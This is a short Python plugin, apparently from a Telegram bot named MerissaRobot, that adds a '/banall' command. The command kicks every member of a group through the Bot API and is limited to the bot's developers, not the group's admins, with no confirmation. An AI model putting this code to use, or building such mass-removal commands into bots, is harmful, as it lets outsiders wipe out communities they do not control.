import aiohttp
from pyrogram import Client, filters
from pyrogram.types import Message

from MerissaRobot import DEV_USERS, TOKEN, pbot


@pbot.on_message(filters.command("banall") & filters.group & filters.user(DEV_USERS))
async def ban_all(c: Client, m: Message):
    chat = m.chat.id
    async for member in pbot.get_chat_members(chat):
        user_id = member.user.id
        url = f"https://api.telegram.org/bot{TOKEN}/kickChatMember?chat_id={chat}&user_id={user_id}"
        async with aiohttp.ClientSession() as session:
            await session.get(url)
